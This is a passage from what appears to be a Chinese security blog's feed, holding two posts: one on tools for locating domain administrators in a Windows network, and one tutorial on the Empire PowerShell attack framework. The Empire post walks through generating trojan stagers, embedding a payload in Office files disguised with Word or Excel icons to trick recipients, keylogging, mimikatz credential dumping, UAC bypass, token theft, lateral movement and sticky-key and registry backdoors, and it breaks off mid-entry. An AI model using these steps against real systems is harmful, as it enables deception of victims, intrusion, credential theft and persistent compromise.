    <content type="html"><![CDATA[<p>内网渗透与常规的渗透测试是截然不同 的。内网渗透测试的需求是，获取内网中特定用户或机器的权限，进而获得特定的资源，对内网的安全性进行评估。</p><h2 id="域管理定位概述"><a href="#域管理定位概述" class="headerlink" title="域管理定位概述"></a>域管理定位概述</h2><p>  在内网中，通常会部署大量的网络安全系统和设备，列入IDS,IPS,日志审计，安全网关，反病毒软件等。在域网络攻击测试中，获取域管理员权限。<br>      在一个域中，当计算机加入域后，会默认给域管理员组赋予本地系统管理员权限。也就是说，当计算机被添加到域中，成为域的成员主机后，系统会自动将域管理员组添加到本地系统管理员组中。因此，域管理员组的成员均可访问本地计算机，具备完全控制权限。<br>    定位域内管理员的常规渠道，一是日志，而是会话。日志是指本地机器的管理员日志，可以使用脚本或Wevtutil工具导出并查看。会话是指域内每台机器的登录会话，可以使用netsess.exe或PowerView等工具查询(可以匿名查询，不需要权限)</p><h2 id="常用域管理员定位工具"><a href="#常用域管理员定位工具" class="headerlink" title="常用域管理员定位工具"></a>常用域管理员定位工具</h2><p>常用的域管理员定位工具有psloggedon.exe,PVEFindADUser.exe,netsess.exe,以及hunter,NetView等，在powershell中，常用的工具是PowerView。<br><strong>1.Psloggedon.exe</strong><br>在windows平台上，可以执行命令”net session”来查看谁使用了本机资源，但是没有命令可以用来查看谁在使用远程计算机资源，谁登录了本地或远程计算机。<br>使用psloggedon.exe，可以查看本地登录的用户和通过本地计算机或远程计算机的资源登录用户。如果指定的是用户名而不是计算机名，psloggedon.exe会搜索网上邻居中的计算机，并显示该用户当前是否已经登录。其原理是通过检查注册表HKEY_USERS项的key值来查询谁登录过，但某些功能需要管理员权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">psloggedon [-] [-x] [-l] [\\computername| username]<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/image-20240107154537796.png" alt="image-20240107154537796"></p><ul><li>-l：仅显示本地登录，不显示本地和网络资源登录。</li><li>-x: 不显示登录时间。</li><li>\computername  指定要列出登录信息的计算机的名称。</li><li>username: 指定用户名，在网络中搜索该用户登录的计算机。</li></ul><p>下载地址：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p><p>2.<strong>PVEFindADUser.exe</strong><br>PVEFindADUser.exe可用于查找活动目录用户登录的位置，枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户，通过RDP登录的用户、用于运行服务和计划任务的用户。运行该工具的计算机需要配置 .NET Framework2.0环境，并且需要具有管理员权限。<br><img src="/2022/06/15/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/image-20240107154548642.png" alt="image-20240107154548642"><br>这里我的没连接成功，不知道为什么，希望有大佬告诉我。</p><ul><li>-u:检查程序是否有新版本</li><li>-current [‘username’]:如果仅指定-current参数，将获取目标计算机上当前登录的所有用户。如果指定用户名(Domain\Username),则显示该用户登录的计算机。</li><li>last[“username”]:如果仅指定了 -last参数，将获取目标计算机的最后一个登录用户，如果指定了用户名(Domain\username），则显示此用户上次登录的计算机。根据网络的安全策略。可能会隐藏最后一个登录用户的用户名，此时使用该工具可能无法得到该用户名。</li><li>noping：阻止该工具在尝试获取用户登录信息之前对目标计算机执行Ping命令。</li><li>target：可选参数，用于指定要查询的主机。如果未指定此参数，将查询当前域中的所有主机，如果指定此参数，则后跟一个由逗号分隔的主机名列表。</li></ul><p>下载地址：<a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a><br><strong>3.netview.exe</strong><br> netview.exe 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 找寻登录会话， 利用 NetShareEnum 找寻共享，利用 NetWkstaUserEnum 枚举登录的用户。同时，netview.exe 能够 查询共享入口和有价值用户。netview.exe的绝大部分功能不需要管理员权限就可以使用。<br><img src="/2022/06/15/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/image-20240107154601537.png" alt="image-20240107154601537"></p><ul><li>-f filename.txt:指定从中提取主机列表的文件。</li><li>-e filename.txt:指定要排除的主机名文件。</li><li>-o filename.txt:将所有输出重定向到文件。</li><li>-d domain:指定从中提取主机列表的域。如果没有指定，则使用当前域。</li><li>-g group:指定用户搜寻的组名。如果没有指定，则使用 Domain Admins。</li><li>-c:检查对已找到共享的访问权限。</li></ul><p>下载地址：<a href="https://malicious.link/projects/netview.exe">https://malicious.link/projects/netview.exe</a></p><p><strong>4.PowerView脚本</strong><br>PowerView是一款powershell脚本，提供了辅助定位关键用户的功能。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell.exe -<span class="hljs-built_in">exec</span>  bypass -Command <span class="hljs-string">&quot;&amp; (Import-Module .\PowerView.ps1; Invoke-StealthUserHunter)&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/image-20240107154616504.png" alt="image-20240107154616504"></p><ul><li>Invoke-StealthUserHunter ：只需要进行一次查询，就可以获取域里面的所有用户。使用方法为，从user.HomeDirectories中提取所有用户，并对每台服务器进行Get-NetSession获取。因此不需要使用Invoke-UserHunter对每台机器进行操作，所以这个方法的隐蔽性相对较高(但涉及的机器不一定全面)。PowerView默认使用Invoke-SteathUserHunter,如果找不到需要的信息，就使用Invoke-UserHunter。</li><li>Invoke-UserHunter :找到域内特定的用户群，接收用户名，用户列表和域组查询，接收一个主机列表或查询可用的主机域名。它可以使用Get-NetSessions和Get-NetLoggedon(调用NetSessionEnum和NetWkstaUserEnum API)扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，在使用时不需要管理员权限。</li></ul><p>下载地址：<a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a></p><p><strong>5.Empire中的user_hunter模块</strong><br> 在 Empire 下user_hunter模块用来查找域管理员登录的机器的。<br>获取反弹shell<br>使用命令<br>usemodule situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter<br>我机器出问题了就不演示这个了</p><p>参考：<a href="https://timeshu.github.io/2020/02/08/%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AE%9A%E4%BD%8D%E5%B7%A5%E5%85%B7/">https://timeshu.github.io/2020/02/08/%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AE%9A%E4%BD%8D%E5%B7%A5%E5%85%B7/</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>定位域管理员</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Empire使用</title>
    <link href="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>Empire是一款针对windows平台的，使用powershell脚本作为攻击载荷的渗透攻击框架工具，具有从stager生成，提权到渗透维持的一系列功能。 无需powershell.exe就可运行Powershell代理的功能，还可以快速再后期部署漏洞利用模块，其内置模块有键盘记录,mimikatz,绕过UAC，内网扫描等，并且能够躲避网络检测和大部分安全防护工具的查杀，简单来说有点类似于Metasploit，是一个基于Powershell的远程控制木马。</p><p>全部功能参照：<a href="http://www.powershellempire.com/">http://www.powershellempire.com/</a></p><h4 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h4><p>git  clone <a href="https://github.com/EmpireProject/Empire.git">https://github.com/EmpireProject/Empire.git</a></p><p>接着</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> Empire<br><span class="hljs-built_in">cd</span> setup<br>sudo ./install.sh<br>./empire          <span class="hljs-comment">#即可打开</span><br></code></pre></td></tr></table></figure><p>和metasploit使用原理都是一样的，都是先设置一个监听，接着生成木马，然后在目标主机中运行该木马，我们的监听就会连接上返弹回来的代理</p><h4 id="建立监听："><a href="#建立监听：" class="headerlink" title="建立监听："></a>建立监听：</h4><p>输入Listeners   进入监听线程界面    可以输入help查看帮助</p><p>接着输入uselistener来设置采用何种模式，通过双击tab键可以看到一共有7中模式：</p><p>dbx,http,http_com,http_foreign,http_hop,http_mapi,meterpreter</p><p>使用http监听模式：</p><p>uselistener  http</p><p>然后输入     info       查看具体参数</p><p>通过set命令设置参数</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> Name  shuteer<br><span class="hljs-built_in">set</span> Host XX.XX.XXX.XX:XXX (Empir所在服务器IP)<br><br>HOST是我们VPN的IP，所以就不做修改了，修改完后可以再次输入info，查看设置是否正确<br>然后输入execute即可监听<br></code></pre></td></tr></table></figure><p>输入back命令即可返回上一层listeners界面</p><p>输入list命令可以列出当前激活的listener</p><p>使用kill命令就能删除该监听</p><p>agents下：</p><p>kill all 杀死所有进程</p><p>remove all 删除所有</p><h4 id="生成木马："><a href="#生成木马：" class="headerlink" title="生成木马："></a>生成木马：</h4><p>输入usestaget来设置采用何种模块，同样双击tab键，可以看到共26个模块。</p><p>其中multi为通用模块，osx是mac操作系统模块，剩下的就是windows的模块。</p><ul><li><p>DLL木马</p><p>想要设置dll木马，首先输入    usestager  windows&#x2F;dll</p><p>然后输入info命令查看详细参数。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> Listener shuteer<br>execute     <span class="hljs-comment">#生成木马</span><br>就会在tmp目录下生成名为launcher.dll木马<br></code></pre></td></tr></table></figure></li><li><p>launcher</p><p>如果只需要简单的powershell代码，在设置完相应模块后，可以直接在监听器菜单中键入:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">launcher    &lt;language&gt;&lt;listerName&gt;<br></code></pre></td></tr></table></figure><p>将很快生成一行base64编码代码，这里输入back命令回到listener下</p><p>然后输入launcher powershellshuteer(当前设置的listener名字)命令来生成一个payload.</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">launcher  powershell <span class="hljs-keyword">shuteer </span>    <span class="hljs-comment">#生成powershell代码</span><br></code></pre></td></tr></table></figure></li><li><p>launcher_vbs木马</p><p>输入usestager windows&#x2F;launcher_vbs</p><p>输入info   查看设置参数</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> listener shuteer<br>execute                  <span class="hljs-comment">#生成的文件在tmp目录下</span><br></code></pre></td></tr></table></figure><p>最后输入back回到listener开始监听</p><p>如果要生成powershell代码，设置完listener后不输入execute，直接输入back,然后输入launcher powershll shuteer即可</p></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">launcher   powershell shuteer<br></code></pre></td></tr></table></figure><ul><li><p>launcher_bat木马</p><p>usestager    windows&#x2F;launcher_bat</p><p>info</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">set listener  shuteer<span class="hljs-built_in"></span><br><span class="hljs-built_in">execute </span>                <br></code></pre></td></tr></table></figure><p>为了增加迷惑性，也可以将该批处理文件插入一个offic文件中，这里随便找一个word或者excel文件中，单击”插入”–&gt;”对象”–&gt;”由文件创建-“-&gt;</p></li></ul><p>“浏览”(选择刚刚生成的批处理文件，然后勾选”显示为图标”)</p><p>在”更改图标”界面里，我们可以选择一个图标，这里建议使用微软的Excel，Word或者PowerPoint图标</p><p>选择完之后，点击确定，该对象就会插入到文件中</p><p>将该文件发给别人，一旦打开该文件，并运行了内嵌的批处理文件，就会得到这个主机的权限</p><p>360安全卫士会报告发现宏病毒</p><h3 id="Macro木马："><a href="#Macro木马：" class="headerlink" title="Macro木马："></a>Macro木马：</h3><p>要想设置Macro木马，首先需要输入usestager windows&#x2F;macro命令然后输入info命令插卡详细信息：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">Set listener  shuteer<br>Execute<br></code></pre></td></tr></table></figure><p>默认会生成一个宏，储存在&#x2F;tmp&#x2F;macro文件中</p><p>然后需要将生成的宏添加到一个Office文档里面，这里打开一个word文件，单击‘视图’    标签，选择   ‘宏’    ，在‘宏的位置’    选择当前文件，宏名可以任意起一个，然后单击  ”创建“    按钮</p><p>单击  ”创建“  按钮以后会弹出VB编辑界面，将原来的代码删除，把生成的宏复制进去，另存为一个新文件。</p><p>最后将这个修改果的word拷到目标机上执行，打开后会提示一个安全警告，这里需要使用一些社会工程学的策略。</p><h3 id="Ducky"><a href="#Ducky" class="headerlink" title="Ducky:"></a>Ducky:</h3><p>输入  usestager   windows&#x2F;ducky</p><p>然后   info   查看帮助信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> listener shuteer<br>execute<br></code></pre></td></tr></table></figure><p>执行完就可以生成用于烧制的代码</p><p>将该代码烧制至”小黄鸭“中，插入目标用户的计算机，就可以反弹回来。</p><p><a href="https://www.freebuf.com/geek/141839.html">https://www.freebuf.com/geek/141839.html</a></p><h2 id="连接主机的基本使用："><a href="#连接主机的基本使用：" class="headerlink" title="连接主机的基本使用："></a>连接主机的基本使用：</h2><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><p>1.列出以连接的主机</p><p>agents</p><p>然后使用   interact 连接主机<br><img src="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/image-20240107212959717.png" alt="image-20240107212959717"></p><p>输入help 可以查看帮助信息</p><p>2.一些基本命令</p><ul><li><p>pwd     显示当前目录</p></li><li><p>getpid   查看当前进程<br><img src="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/image-20240107213007073.png" alt="image-20240107213007073"></p></li><li><p>输入help agentcmds     可以看到可供使用的常用命令<br><img src="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/image-20240107213016365.png" alt="image-20240107213016365"></p></li><li><p>在使用部分cmd命令时，要使用”shell +命令”的格式</p></li><li><p>内置mimikatz但需要管理员权限<br>输入mimikatz<br>然后输入 creds命令可以自动过滤，整理出获取的用户密码<br><img src="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/image-20240107213026232.png" alt="image-20240107213026232"></p></li></ul><p>导出凭证：creds export 目录&#x2F;xx</p><ul><li>在实际渗透过程中，由于种种原因，总会有部分主机丢失或失效，可以输入<br>list stale  命令列出已经丢失的反弹主机，然后输入remove stale 命令删去已经失效的主机<br><img src="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/image-20240107213034838.png" alt="image-20240107213034838"></li></ul><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>可以使用search  module 命令搜索需要使用的模块</p><p>通过使用 usemodule collection 然后Tab查看完整的列表</p><p>1.截屏</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule collection/screenshot<br><br>info <br><br>execute<br>back<br></code></pre></td></tr></table></figure><p>2.键盘记录</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule collection/keylogger<br>info<br>execute<br>back<br></code></pre></td></tr></table></figure><p>如果要持续进行键盘记录，可以把当前监控模块置于后台，输入jobs即可显示当前在后台的记录</p><p>如果要停止记录输入</p><p>jobs kill  jobs_name</p><p>3.查找共享</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/network/powerview/share_finder<br>execute<br>back<br></code></pre></td></tr></table></figure><p>4.收集目标主机信息</p><p>该模块可以查看本机用户。域组成员，最后的密码设置时间，剪贴板内容，系统基本信息，网络适配器等</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/host/winenum<br>execute<br></code></pre></td></tr></table></figure><p>5.列举系统信息(重点)</p><p>几乎列举了系统中的所有有用信息，如目标主机时间日志，应用程序控制策略日志，包括RDP登录信息，powershell脚本运行和保存的信息等。在运行这个脚本时需要管理员权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/host/computerdetails<br>execute<br></code></pre></td></tr></table></figure><p>6.ARP扫描</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule  situational_awareness/network/arpscan<br><span class="hljs-built_in">set</span> Range 192.168.31.0-192.168.31.254     <span class="hljs-comment">#设置扫描网段</span><br>execute<br></code></pre></td></tr></table></figure><p>7.DNS信息收集</p><p>在内网中，知道所有及其的Hostname和对应的IP地址对分析内网结构至关重要</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/network/reverse_dns<br>execute<br></code></pre></td></tr></table></figure><p>如果主机有两张网卡，Empire也会显示出来。方便我们寻找边界主机</p><p>8.查找域管登录服务器IP</p><p>在内网渗透中，要想拿到内网中某台机器的域管权限，方法之一就是找到域管登录的机器，然后横向渗透进去。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">该模块就是用来查找域管登录的机器,可以清除的看到那个用户登录了那台主机<br>usemodule  situational_awareness/network/powerview/user_hunter<br></code></pre></td></tr></table></figure><p>9.本地管理组访问模块</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/network/powerview/find_localadmin_access<br></code></pre></td></tr></table></figure><p>10.获取域控制器</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/network/powerview/get_domain_controller<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/image-20240107213044907.png" alt="image-20240107213044907"></p><p>得知当前域服务器名为DC</p><p>在验证能否访问域服务器DC的“C$’’</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SH">shell <span class="hljs-built_in">dir</span> \\DC\C$<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/image-20240107213054066.png" alt="image-20240107213054066"></p><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><ul><li><p>Bypass  UAC</p><p>输入：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule privesc/bypassuac<br>info<br><span class="hljs-built_in">set</span> Listener .....<br>execute<br></code></pre></td></tr></table></figure><p>然后会发现上线了一个新的反弹</p><p>back</p><p>agents</p><p>带星号的即为权限提升成功的agents</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-3pKc9smF-1619775511101)(..&#x2F;typora&#x2F;pic&#x2F;image-20201226224409704.png)]</p></li><li><p>bypassuac_wscript</p><p>这个模块的大概原理是使用c:\Windows\wscript.exe执行payload,即绕过UAC实现管理员权限执行Payload,只适用于系统位Windows 7的目标主机，目前尚没有对应的补丁，部分杀毒软件会有提示。</p><p>输入:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">    usemodule privesc/bypassuac_wscript<br>info<br><span class="hljs-built_in">set</span> Listener .....<br>execute<br></code></pre></td></tr></table></figure><p>带星号表示权限提升成功</p></li></ul><h4 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h4><p>Empire内置了PowerUp的部分工具，用于权限提升，主要有Windows错误系统配置漏洞，Windows Services漏洞，AlwaysInstallElevated漏洞等8种提权方式。<br><img src="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/image-20240107213106262.png" alt="image-20240107213106262"><br>输入:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule privesc/powerup<br></code></pre></td></tr></table></figure><p>1.allchecks</p><p>查找系统中的漏洞，和powerSploit中的Invoke-AllChecks模块一样，该模块可以执行所有脚本检查系统漏洞</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule privesc/powerup/allchecks<br>execute<br></code></pre></td></tr></table></figure><p>一般会列出一些提权方法：</p><p>可以尝试bypass  UAC来提权</p><p>接着输入bypassuac   root1(listener 名字)</p><p>星号表示提权成功</p><h4 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h4><p>在域里常会启用组策略首选项来更改本地密码，便于管理和部署映像，其缺点是任何普通域用户都可以从相关域控制器的SYSVOL中读取部署信息。GPP是采用AES 256加密的</p><p>输入以下命令即可查看</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule privesc/gpp<br></code></pre></td></tr></table></figure><h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><ul><li><h4 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h4><p>在获取服务器权限后，可以使用内置的Mimikatz获取系统密码，执行完毕后输入creds</p><p>命令即可查看Empire列举的密码。</p><p>可以发现有域用户曾在此服务器上登录，此时可以窃取域用户身份，然后进行横向渗透，首先要窃取身份</p><p>使用pth<ID>命令</ID></p><p>这里ID就是creadID号<br><img src="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/image-20240107213118287.png" alt="image-20240107213118287"></p><p><img src="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/image-20240107213129942.png" alt="image-20240107213129942"></p></li></ul><p>可以看到执行完之后显示PID进程为2040</p><p>使用steal_token  PID命令即可窃取该身份</p><p>同样可以输入ps查看是否有域用户的进程</p><p>如果有同样通过   steal_token命令来窃取这个令牌</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">steal_token  PID<br></code></pre></td></tr></table></figure><p>输入  revtoself   命令可以将令牌权限恢复到原来的状态。</p><ul><li><h4 id="会话注入"><a href="#会话注入" class="headerlink" title="会话注入"></a>会话注入</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule management/psinject<br><span class="hljs-built_in">set</span> Listener <br><span class="hljs-built_in">set</span> ProcId             <span class="hljs-comment">#设置进程id</span><br></code></pre></td></tr></table></figure><p>该模块进行进程注入，获取权限。</p><p>设置Listener 和Proc  ID这两个参数运行反弹shell</p></li></ul><p><img src="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/image-20240107213141124.png" alt="image-20240107213141124"></p><ul><li><h4 id="Invoke-PsExec"><a href="#Invoke-PsExec" class="headerlink" title="Invoke-PsExec"></a>Invoke-PsExec</h4></li></ul><p>  缺点：是能被基本的杀毒软件检测并留下日志，而且需要开启admiin$445端口共享</p><p>  优点：是可以直接返回system权限。</p><p>  该模块的前提是已经获得本地管理员权限，甚至域管理员账户，然后以此进一步持续渗透整个内网。</p>  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule lateral_movement/invoke_psexec<br><span class="hljs-built_in">set</span> Listener    <span class="hljs-comment">#设置监听名</span><br><span class="hljs-built_in">set</span>  ComputerName     <span class="hljs-comment">#设置机器名</span><br>execute<br></code></pre></td></tr></table></figure><p>  [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-EiuWuqes-1619775582049)(..&#x2F;typora&#x2F;pic&#x2F;image-20201227125717808.png)]</p><ul><li><h4 id="Invoke-WMI"><a href="#Invoke-WMI" class="headerlink" title="Invoke -WMI"></a>Invoke -WMI</h4><p>比Ps-Exec安全，所有windows系统都启用了该服务，不会写入日志。极高隐蔽性。如果目标机开启了防火墙WMI将无法连接目标机器。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule lateral_movement/invoke_wmi<br><span class="hljs-built_in">set</span> Listener    <span class="hljs-comment">#设置监听名</span><br><span class="hljs-built_in">set</span>  ComputerName     <span class="hljs-comment">#设置机器名</span><br>execute<br></code></pre></td></tr></table></figure></li><li><h4 id="PowerShell-Remoting"><a href="#PowerShell-Remoting" class="headerlink" title="PowerShell Remoting"></a>PowerShell Remoting</h4><p>Powershell Remoting是Powershell 的远程管理功能。开启windows远程管理服务WinRM系统会监听5985端口，该服务默认在windows server2012中是开启的，在windows server 2003&#x2F;2008&#x2F;2008 R2中需要手动启动。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">   usemodule lateral_movement/invoke_paremoting<br><span class="hljs-built_in">set</span> Listener    <span class="hljs-comment">#设置监听名</span><br><span class="hljs-built_in">set</span>  ComputerName     <span class="hljs-comment">#设置机器名</span><br>execute<br></code></pre></td></tr></table></figure></li></ul><h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p>  后门最主要的目的就是方便以后再次秘密进入或者控制系统</p><ul><li><h4 id="权限持久性劫持shift后门"><a href="#权限持久性劫持shift后门" class="headerlink" title="权限持久性劫持shift后门"></a>权限持久性劫持shift后门</h4><p>输入：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule lateral_movement/invoke_wmi_debugger<br><span class="hljs-built_in">set</span> Listener    <span class="hljs-comment">#设置监听名</span><br><span class="hljs-built_in">set</span>  ComputerName     <span class="hljs-comment">#设置机器名</span><br><span class="hljs-built_in">set</span> TargetBinary  sethc.exe<br>execute<br></code></pre></td></tr></table></figure><p>运行完后再目标主机远程登录窗口按5次shift键即可触发后门。</p><p>sethc.exe可以替换成以下这几项：</p><p>1.Utilman.exe(使用Win+U组合键启动)</p><p>2.osk.exe(屏幕上的键盘：使用win+U启动组合键)</p><p>3.Narrator.exe(启动讲述人：使用win+U启动组合键)</p><p>4.Magnify.exe(放大镜:使用Win+U组合键启动)</p></li><li><h4 id="注册表注入后门"><a href="#注册表注入后门" class="headerlink" title="注册表注入后门"></a>注册表注入后门</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule persistence/userland/registry<br><span 